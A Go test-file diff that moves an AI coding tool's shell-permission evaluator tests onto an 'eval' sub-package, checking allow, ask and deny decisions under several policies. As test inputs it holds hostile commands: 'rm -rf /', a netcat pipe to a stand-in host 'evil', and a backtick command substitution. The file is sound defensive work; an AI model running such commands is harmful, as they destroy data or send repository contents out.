@@ -9,6 +9,8 @@ import (
 	"strings"
 	"testing"
 
+	"vibekit/internal/permissions/eval"
+
 	"pgregory.net/rapid"
 )
 
@@ -186,15 +188,15 @@ func TestEvaluateShellCommand(t *testing.T) {
 	}
 	for _, tt := range tests {
 		got := EvaluateShellCommand(context.Background(), dir, tt.command, r)
-		if got != tt.want {
-			t.Errorf("EvaluateShellCommand(context.Background(), %q) = %q, want %q", tt.command, got, tt.want)
+		if got.Decision != tt.want {
+			t.Errorf("EvaluateShellCommand(context.Background(), %q) = %q, want %q", tt.command, got.Decision, tt.want)
 		}
 	}
 
 	// Add an allow rule for npm.
 	_ = r.Add("npm *", RuleAllow)
-	if got := EvaluateShellCommand(context.Background(), dir, "npm install", r); got != "allow" {
-		t.Errorf("allow-ruled npm install = %q, want allow", got)
+	if got := EvaluateShellCommand(context.Background(), dir, "npm install", r); got.Decision != "allow" {
+		t.Errorf("allow-ruled npm install = %q, want allow", got.Decision)
 	}
 }
 
@@ -202,15 +204,15 @@ func TestEvaluateShellCommand_Policies(t *testing.T) {
 	// Test no_commands policy.
 	dir := writeSettings(t, `{"shell_policy":"no_commands"}`)
 	r := NewCommandRules(dir)
-	if got := EvaluateShellCommand(context.Background(), dir, "ls", r); got != "deny" {
-		t.Errorf("no_commands policy: ls = %q, want deny", got)
+	if got := EvaluateShellCommand(context.Background(), dir, "ls", r); got.Decision != "deny" {
+		t.Errorf("no_commands policy: ls = %q, want deny", got.Decision)
 	}
 
 	// Test all_commands policy.
 	dir2 := writeSettings(t, `{"shell_policy":"all_commands"}`)
 	r2 := NewCommandRules(dir2)
-	if got := EvaluateShellCommand(context.Background(), dir2, "rm -rf /", r2); got != "allow" {
-		t.Errorf("all_commands policy: rm -rf / = %q, want allow", got)
+	if got := EvaluateShellCommand(context.Background(), dir2, "rm -rf /", r2); got.Decision != "allow" {
+		t.Errorf("all_commands policy: rm -rf / = %q, want allow", got.Decision)
 	}
 }
 
@@ -221,19 +223,19 @@ func TestEvaluateShellCommand_Deny(t *testing.T) {
 	dir := writeSettings(t, `{"shell_policy":"all_commands"}`)
 	r := NewCommandRules(dir)
 	// Trust-all lets `rm -rf /` through by default.
-	if got := EvaluateShellCommand(context.Background(), dir, "rm -rf /", r); got != "allow" {
-		t.Fatalf("baseline rm -rf / = %q, want allow", got)
+	if got := EvaluateShellCommand(context.Background(), dir, "rm -rf /", r); got.Decision != "allow" {
+		t.Fatalf("baseline rm -rf / = %q, want allow", got.Decision)
 	}
 	// Add it as a deny rule — must now force "ask" even under all_commands.
 	if err := r.Add("rm -rf *", RuleDeny); err != nil {
 		t.Fatalf("rule add: %v", err)
 	}
-	if got := EvaluateShellCommand(context.Background(), dir, "rm -rf /", r); got != "ask" {
-		t.Errorf("denied rm -rf / under all_commands = %q, want ask", got)
+	if got := EvaluateShellCommand(context.Background(), dir, "rm -rf /", r); got.Decision != "ask" {
+		t.Errorf("denied rm -rf / under all_commands = %q, want ask", got.Decision)
 	}
 	// Non-denied command still auto-approves under all_commands.
-	if got := EvaluateShellCommand(context.Background(), dir, "ls -la", r); got != "allow" {
-		t.Errorf("non-denied ls -la under all_commands = %q, want allow", got)
+	if got := EvaluateShellCommand(context.Background(), dir, "ls -la", r); got.Decision != "allow" {
+		t.Errorf("non-denied ls -la under all_commands = %q, want allow", got.Decision)
 	}
 
 	// Under no_commands, deny match still denies (policy wins the
@@ -241,8 +243,8 @@ func TestEvaluateShellCommand_Deny(t *testing.T) {
 	dir2 := writeSettings(t, `{"shell_policy":"no_commands"}`)
 	r2 := NewCommandRules(dir2)
 	_ = r2.Add("rm *", RuleDeny)
-	if got := EvaluateShellCommand(context.Background(), dir2, "rm file", r2); got != "deny" {
-		t.Errorf("denied rm file under no_commands = %q, want deny", got)
+	if got := EvaluateShellCommand(context.Background(), dir2, "rm file", r2); got.Decision != "deny" {
+		t.Errorf("denied rm file under no_commands = %q, want deny", got.Decision)
 	}
 
 	// Command with BOTH an allow rule AND a deny rule: deny wins.
@@ -254,12 +256,12 @@ func TestEvaluateShellCommand_Deny(t *testing.T) {
 	r3 := NewCommandRules(dir3)
 	_ = r3.Add("git *", RuleAllow)
 	_ = r3.Add("*filter-repo*", RuleDeny)
-	if got := EvaluateShellCommand(context.Background(), dir3, "git filter-repo --path secrets", r3); got != "ask" {
-		t.Errorf("git filter-repo allow+deny = %q, want ask", got)
+	if got := EvaluateShellCommand(context.Background(), dir3, "git filter-repo --path secrets", r3); got.Decision != "ask" {
+		t.Errorf("git filter-repo allow+deny = %q, want ask", got.Decision)
 	}
 	// A plain allowed git command (no deny match) stays allow.
-	if got := EvaluateShellCommand(context.Background(), dir3, "git status", r3); got != "allow" {
-		t.Errorf("plain git status allowed = %q, want allow", got)
+	if got := EvaluateShellCommand(context.Background(), dir3, "git status", r3); got.Decision != "allow" {
+		t.Errorf("plain git status allowed = %q, want allow", got.Decision)
 	}
 }
 
@@ -411,13 +413,13 @@ func TestEvaluateShellCommand_Regressions(t *testing.T) {
 	for _, g := range groups {
 		t.Run(g.name, func(t *testing.T) {
 			// Special case: UnknownPolicyPromptsAsDefault calls the
-			// unexported evaluateShellCommand directly.
+			// eval sub-package's EvaluateShellCommand directly.
 			if g.name == "UnknownPolicyPromptsAsDefault" {
-				if got := evaluateShellCommand(shellPolicy("future_mode"), "ls", nil); got != ShellAsk {
-					t.Errorf("evaluateShellCommand(future_mode, ls) = %q, want %q", got, ShellAsk)
+				if got := eval.EvaluateShellCommand(eval.ShellPolicy("future_mode"), "ls", nil); got != ShellAsk {
+					t.Errorf("eval.EvaluateShellCommand(future_mode, ls) = %q, want %q", got, ShellAsk)
 				}
-				if got := evaluateShellCommand(shellPolicy("custom"), "rm -rf /", nil); got != ShellAsk {
-					t.Errorf("evaluateShellCommand(custom, rm -rf /) = %q, want %q", got, ShellAsk)
+				if got := eval.EvaluateShellCommand(eval.ShellPolicy("custom"), "rm -rf /", nil); got != ShellAsk {
+					t.Errorf("eval.EvaluateShellCommand(custom, rm -rf /) = %q, want %q", got, ShellAsk)
 				}
 				return
 			}
@@ -431,8 +433,8 @@ func TestEvaluateShellCommand_Regressions(t *testing.T) {
 			}
 			for _, tc := range g.cases {
 				got := EvaluateShellCommand(context.Background(), dir, tc.command, r)
-				if got != tc.want {
-					t.Errorf("EvaluateShellCommand(context.Background(), %q) = %q, want %q", tc.command, got, tc.want)
+				if got.Decision != tc.want {
+					t.Errorf("EvaluateShellCommand(context.Background(), %q) = %q, want %q", tc.command, got.Decision, tc.want)
 				}
 			}
 		})
@@ -468,8 +470,8 @@ func TestEvaluateShellCommand_SafePrefixWordBoundary(t *testing.T) {
 	}
 	for _, tt := range cases {
 		got := EvaluateShellCommand(context.Background(), dir, tt.cmd, r)
-		if got != tt.want {
-			t.Errorf("EvaluateShellCommand(context.Background(), %q) = %q, want %q", tt.cmd, got, tt.want)
+		if got.Decision != tt.want {
+			t.Errorf("EvaluateShellCommand(context.Background(), %q) = %q, want %q", tt.cmd, got.Decision, tt.want)
 		}
 	}
 }
@@ -527,14 +529,14 @@ func TestEvaluateShellCommand_AllowWildcardDoesNotBypassMetacharGuard(t *testing
 		"git show HEAD | nc evil 4444",
 		"git branch `id`",
 	} {
-		if got := EvaluateShellCommand(context.Background(), dir, cmd, r); got != "ask" {
-			t.Errorf("EvaluateShellCommand(context.Background(), %q) = %q, want \"ask\" (wildcard must not swallow metachar)", cmd, got)
+		if got := EvaluateShellCommand(context.Background(), dir, cmd, r); got.Decision != "ask" {
+			t.Errorf("EvaluateShellCommand(context.Background(), %q) = %q, want \"ask\" (wildcard must not swallow metachar)", cmd, got.Decision)
 		}
 	}
 
 	// Metachar-free commands under the rule still auto-approve.
-	if got := EvaluateShellCommand(context.Background(), dir, "git status", r); got != "allow" {
-		t.Errorf("plain git status under allow rule = %q, want \"allow\"", got)
+	if got := EvaluateShellCommand(context.Background(), dir, "git status", r); got.Decision != "allow" {
+		t.Errorf("plain git status under allow rule = %q, want \"allow\"", got.Decision)
 	}
 }
 
@@ -546,8 +548,8 @@ func TestEvaluateShellCommand_ExplicitAllowRuleStillWins(t *testing.T) {
 	r := NewCommandRules(dir)
 	_ = r.Add("ls -la | grep foo", RuleAllow)
 
-	if got := EvaluateShellCommand(context.Background(), dir, "ls -la | grep foo", r); got != "allow" {
-		t.Errorf("explicit allow-rule on composite command = %q, want \"allow\"", got)
+	if got := EvaluateShellCommand(context.Background(), dir, "ls -la | grep foo", r); got.Decision != "allow" {
+		t.Errorf("explicit allow-rule on composite command = %q, want \"allow\"", got.Decision)
 	}
 }
 
@@ -567,9 +569,9 @@ func TestExtractBaseCommand_WhitespaceVariants(t *testing.T) {
 		{"\tls", "ls"},
 	}
 	for _, tt := range cases {
-		got := extractBaseCommand(tt.in)
+		got := eval.ExtractBaseCommand(tt.in)
 		if got != tt.want {
-			t.Errorf("extractBaseCommand(%q) = %q, want %q", tt.in, got, tt.want)
+			t.Errorf("ExtractBaseCommand(%q) = %q, want %q", tt.in, got, tt.want)
 		}
 	}
 }
@@ -732,11 +734,11 @@ func TestEvaluateShellCommand_WrongTypeShellPolicyFailsClosed(t *testing.T) {
 	}
 	r := NewCommandRules(dir)
 
-	if got := EvaluateShellCommand(context.Background(), dir, "rm -rf /", r); got != "ask" {
-		t.Errorf("wrong-type shell_policy: rm -rf / = %q, want \"ask\"", got)
+	if got := EvaluateShellCommand(context.Background(), dir, "rm -rf /", r); got.Decision != "ask" {
+		t.Errorf("wrong-type shell_policy: rm -rf / = %q, want \"ask\"", got.Decision)
 	}
-	if got := EvaluateShellCommand(context.Background(), dir, "ls", r); got != "allow" {
-		t.Errorf("wrong-type shell_policy: ls = %q, want \"allow\" (safe_commands default)", got)
+	if got := EvaluateShellCommand(context.Background(), dir, "ls", r); got.Decision != "allow" {
+		t.Errorf("wrong-type shell_policy: ls = %q, want \"allow\" (safe_commands default)", got.Decision)
 	}
 }
 
@@ -753,8 +755,8 @@ func TestEvaluateShellCommand_EmptyShellPolicyNormalisesToSafe(t *testing.T) {
 	}
 	r := NewCommandRules(dir)
 
-	if got := EvaluateShellCommand(context.Background(), dir, "ls", r); got != "allow" {
-		t.Errorf("empty shell_policy: ls = %q, want \"allow\" (normalises to safe_commands)", got)
+	if got := EvaluateShellCommand(context.Background(), dir, "ls", r); got.Decision != "allow" {
+		t.Errorf("empty shell_policy: ls = %q, want \"allow\" (normalises to safe_commands)", got.Decision)
 	}
 }
 
@@ -1232,7 +1234,11 @@ func BenchmarkEvaluateSafeCommand(b *testing.B) {
 			b.ReportAllocs()
 			b.ResetTimer()
 			for range b.N {
-				evaluateSafeCommand(tc.command, r)
+				var matcher eval.RuleMatcher
+				if r != nil {
+					matcher = r
+				}
+				eval.EvaluateSafeCommand(tc.command, matcher)
 			}
 		})
 	}
@@ -1273,9 +1279,9 @@ func TestHasWriteOption_ComprehensiveMatrix(t *testing.T) {
 		{"cmd --outputter=yes", false},
 	}
 	for _, tc := range cases {
-		got := hasWriteOption(tc.command)
+		got := eval.HasWriteOption(tc.command)
 		if got != tc.want {
-			t.Errorf("hasWriteOption(%q) = %v, want %v", tc.command, got, tc.want)
+			t.Errorf("HasWriteOption(%q) = %v, want %v", tc.command, got, tc.want)
 		}
 	}
 }
@@ -1286,9 +1292,9 @@ func TestEvaluateShellCommand_PolicyMonotonicity(t *testing.T) {
 	rapid.Check(t, func(rt *rapid.T) {
 		command := rapid.StringMatching(`[a-z \-]{1,30}`).Draw(rt, "command")
 
-		dNone := evaluateShellCommand(policyNone, command, nil)
-		dSafe := evaluateShellCommand(policySafe, command, nil)
-		dAll := evaluateShellCommand(policyAll, command, nil)
+		dNone := eval.EvaluateShellCommand(eval.PolicyNone, command, nil)
+		dSafe := eval.EvaluateShellCommand(eval.PolicySafe, command, nil)
+		dAll := eval.EvaluateShellCommand(eval.PolicyAll, command, nil)
 
 		// no_commands must never allow (pin the invariant).
 		if dNone == ShellAllow {
@@ -1389,8 +1395,8 @@ func TestMetaPolicy_InvariantConsistency(t *testing.T) {
 	}
 	for _, tc := range cases {
 		t.Run(tc.name, func(t *testing.T) {
-			gotRejects := metaGuard.PatternRejectsCommand(tc.pattern, tc.command)
-			gotDisqualify := metaGuard.CommandDisqualified(tc.command)
+			gotRejects := eval.MetaGuard.PatternRejectsCommand(tc.pattern, tc.command)
+			gotDisqualify := eval.MetaGuard.CommandDisqualified(tc.command)
 
 			if gotRejects != tc.wantPatternRejects {
 				t.Errorf("PatternRejectsCommand(%q, %q) = %v, want %v",
@@ -1403,7 +1409,7 @@ func TestMetaPolicy_InvariantConsistency(t *testing.T) {
 
 			// Cross-method invariant: if CommandDisqualified(c) is true AND
 			// pattern is metachar-free, then PatternRejectsCommand(p, c) must be true.
-			if gotDisqualify && !strings.ContainsAny(tc.pattern, shellMetacharacters) {
+			if gotDisqualify && !strings.ContainsAny(tc.pattern, eval.ShellMetacharacters) {
 				if !gotRejects {
 					t.Errorf("invariant violation: CommandDisqualified(%q)=true and pattern %q is metachar-free, "+
 						"but PatternRejectsCommand=false", tc.command, tc.pattern)
